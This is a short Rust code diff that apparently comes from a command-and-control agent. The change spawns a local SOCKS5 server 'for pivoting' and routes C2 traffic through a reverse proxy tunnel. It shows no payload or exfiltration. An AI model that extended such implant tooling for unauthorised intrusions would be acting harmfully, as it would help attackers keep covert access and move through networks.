@@ -20,6 +20,13 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     if config.socks5_enabled {
         info!("[CONFIG] SOCKS5 is enabled. Proxy: 127.0.0.1:{}, all C2 traffic will use SOCKS5 Reverse Proxy tunnel.", config.socks5_port);
+        // Start SOCKS5 server for pivoting
+        let socks5_port = config.socks5_port;
+        tokio::spawn(async move {
+            if let Err(e) = crate::networking::fast_socks5_pivot::start_socks5_server("127.0.0.1", socks5_port).await {
+                log::error!("[SOCKS5] Server failed: {:?}", e);
+            }
+        });
     } else {
         warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
     }
